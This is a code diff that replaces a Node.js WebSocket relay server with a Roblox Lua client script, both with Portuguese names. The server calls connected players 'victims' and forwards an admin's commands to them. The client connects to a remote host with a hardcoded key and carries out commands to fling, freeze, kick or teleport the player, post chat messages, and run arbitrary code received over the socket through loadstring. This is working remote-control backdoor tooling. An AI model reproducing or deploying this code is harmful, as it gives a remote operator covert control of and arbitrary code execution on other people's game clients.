@@ -1,103 +1,143 @@
-const WebSocket = require('ws');
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
 
-const PORT = process.env.PORT || 8080;
-const wss = new WebSocket.Server({ port: PORT });
+local WS_URL = "wss://kiben-script-server.onrender.com"
+local CHAVE_SECRETA = "BatataFritaComQueijo123"
 
-// A mesma senha secreta que está nos seus scripts do Roblox
-const CHAVE_SECRETA = "BatataFritaComQueijo123";
+local websocket = nil
 
-let clientesConectados = new Map(); // Guarda socket -> nome do jogador (vítimas + admin)
-let painelAdmin = null; // Guarda a conexão do painel de controle
-
-console.log(`[SERVIDOR] WebSocket rodando com sucesso na porta ${PORT}...`);
-
-// Função auxiliar para mandar a lista atualizada de quem está conectado para o admin
-function atualizarListaAdmin() {
-    if (painelAdmin && painelAdmin.readyState === WebSocket.OPEN) {
-        painelAdmin.send(JSON.stringify({
-            tipo: "atualizar_lista",
-            clientes: Array.from(clientesConectados.keys())
-        }));
-    }
-}
-
-wss.on('connection', (ws) => {
-    console.log('[CONEXÃO] Novo cliente conectado ao servidor.');
-
-    ws.on('message', (message) => {
-        let data;
-        try {
-            data = JSON.parse(message);
-        } catch (e) {
-            console.log('[ERRO] Mensagem recebida não é um JSON válido.');
-            return;
-        }
-
-        // 1. Autenticação das Vítimas normais
-        if (data.tipo === 'auth') {
-            if (data.chave !== CHAVE_SECRETA) {
-                console.log('[AUTENTICAÇÃO FALHOU] Chave secreta incorreta de um cliente.');
-                ws.close();
-                return;
-            }
-            clientesConectados.set(data.jogador, ws);
-            ws.nomeJogador = data.jogador;
-            console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
-            atualizarListaAdmin();
-        }
-
-        // 2. Autenticação do Painel Admin (Agora também entra na lista de clientes se mandar o nome!)
-        if (data.tipo === 'auth_admin') {
-            if (data.chave !== CHAVE_SECRETA) {
-                console.log('[AUTENTICAÇÃO FALHOU] Tentativa inválida de login no Admin.');
-                ws.close();
-                return;
-            }
-            painelAdmin = ws;
-            
-            // Registra o admin na lista de conectados para ele aparecer na própria GUI
-            if (data.jogador) {
-                clientesConectados.set(data.jogador, ws);
-                ws.nomeJogador = data.jogador;
-            }
-
-            console.log(`[PAINEL ADMIN CONECTADO]: ${data.jogador || "Admin"}`);
-            atualizarListaAdmin();
-        }
-
-        // 3. O Painel Admin manda um comando para um alvo específico (com suporte a payload e remetente)
-        if (data.tipo === 'comando' && ws === painelAdmin) {
-            let alvoSocket = clientesConectados.get(data.alvo);
-            
-            if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
-                alvoSocket.send(JSON.stringify({
-                    comando: data.comando,
-                    payload: data.payload || null,
-                    remetente: data.remetente || null
-                }));
-                console.log(`[COMANDO ENVIADO] Alvo: ${data.alvo} | Ação: ${data.comando}`);
-            } else {
-                console.log(`[ERRO] Alvo "${data.alvo}" não foi encontrado ou está desconectado.`);
-            }
-        }
-    });
-
-    // Evento quando alguém se desconecta
-    ws.on('close', () => {
-        if (ws === painelAdmin) {
-            painelAdmin = null;
-            console.log('[PAINEL ADMIN] Você se desconectou do servidor.');
-        } 
+local function executarFling()
+    local char = LocalPlayer.Character
+    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+    if rootPart then
+        local bav = Instance.new("BodyAngularVelocity")
+        bav.AngularVelocity = Vector3.new(99999, 99999, 99999)
+        bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+        bav.Parent = rootPart
         
-        if (ws.nomeJogador) {
-            clientesConectados.delete(ws.nomeJogador);
-            console.log(`[CLIENTE DESCONECTADO]: ${ws.nomeJogador}`);
-            atualizarListaAdmin(); // Atualiza a lista tirando quem saiu
-        }
-    });
+        local bv = Instance.new("BodyVelocity")
+        bv.Velocity = Vector3.new(0, 500, 0)
+        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        bv.Parent = rootPart
+        
+        task.spawn(function()
+            task.wait(0.5)
+            bav:Destroy()
+            bv:Destroy()
+        end)
+    end
+end
 
-    // Lida com erros de conexão
-    ws.on('error', (err) => {
-        console.log('[ERRO NO SOCKET]:', err.message);
-    });
-});
+local function executarFreeze()
+    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.Parent.HumanoidRootPart.Anchored = true
+    end
+end
+
+local function executarUnfreeze()
+    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 16
+        humanoid.JumpPower = 50
+        humanoid.Parent.HumanoidRootPart.Anchored = false
+    end
+end
+
+local function executarKick()
+    LocalPlayer:Kick("Você foi desconectado pelo KiBen.")
+end
+
+local function executarBring(payload, remetente)
+    local char = LocalPlayer.Character
+    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+    if rootPart then
+        if type(payload) == "table" then
+            rootPart.CFrame = CFrame.new(Vector3.new(payload[1], payload[2], payload[3]))
+        else
+            local adminPlayer = Players:FindFirstChild(remetente)
+            if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                rootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(3, 0, 3)
+            end
+        end
+    end
+end
+
+local function executarCustomCode(codigo)
+    local success, err = pcall(function()
+        local func = loadstring(codigo)
+        if func then
+            task.spawn(func)
+        end
+    end)
+    if not success then
+        warn("Erro ao executar código customizado: ", err)
+    end
+end
+
+local function executarChat(mensagem)
+    pcall(function()
+        local textChatService = game:GetService("TextChatService")
+        local channels = textChatService:WaitForChild("TextChannels", 2)
+        if channels and channels:FindFirstChild("RBXGeneral") then
+            channels.RBXGeneral:SendAsync(tostring(mensagem))
+            return
+        end
+    end)
+    pcall(function()
+        local chatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
+            chatEvents.SayMessageRequest:FireServer(tostring(mensagem), "All")
+        end
+    end)
+end
+
+local function conectarWebSocket()
+    local success, err = pcall(function()
+        websocket = WebSocket.connect(WS_URL)
+    end)
+
+    if not success then
+        task.wait(5)
+        conectarWebSocket()
+        return
+    end
+
+    websocket:Send(HttpService:JSONEncode({
+        tipo = "auth",
+        chave = CHAVE_SECRETA,
+        jogador = LocalPlayer.Name
+    }))
+
+    websocket.OnMessage:Connect(function(message)
+        local data = HttpService:JSONDecode(message)
+        if not data or not data.comando then return end
+
+        if data.comando == "fling" then
+            executarFling()
+        elseif data.comando == "freeze" then
+            executarFreeze()
+        elseif data.comando == "unfreeze" then
+            executarUnfreeze()
+        elseif data.comando == "kick" then
+            executarKick()
+        elseif data.comando == "bring" then
+            executarBring(data.payload, data.remetente)
+        elseif data.comando == "custom" and data.payload then
+            executarCustomCode(data.payload)
+        elseif data.comando == "chat" and data.payload then
+            executarChat(data.payload)
+        end
+    end)
+
+    websocket.OnClose:Connect(function()
+        websocket = nil
+        task.wait(5)
+        conectarWebSocket()
+    end)
+end
+
+task.spawn(conectarWebSocket)
